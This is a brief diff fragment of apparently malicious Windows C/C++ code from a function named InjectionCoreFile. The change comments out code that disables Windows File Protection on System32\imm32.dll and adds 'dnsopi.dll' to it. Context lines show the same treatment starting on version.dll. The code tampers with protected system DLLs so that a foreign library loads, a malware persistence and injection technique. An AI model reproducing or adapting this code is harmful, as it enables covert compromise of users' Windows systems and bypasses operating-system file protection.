@@ -121,12 +121,12 @@ void InjectionCoreFile() {
 
 	//////////////////////////////////////////////////////////////////////////
 
-	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\imm32.dll"), szTargetPath, MAX_PATH)) {
-		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\imm32.dll"));
-	}
+	//if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\imm32.dll"), szTargetPath, MAX_PATH)) {
+	//	_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\imm32.dll"));
+	//}
 
-	DisableWFP(szTargetPath);
-	AddDllToFile("dnsopi.dll", szTargetPath, FALSE);
+	//DisableWFP(szTargetPath);
+	//AddDllToFile("dnsopi.dll", szTargetPath, FALSE);
 
 	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\version.dll"), szTargetPath, MAX_PATH)) {
 		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\version.dll"));
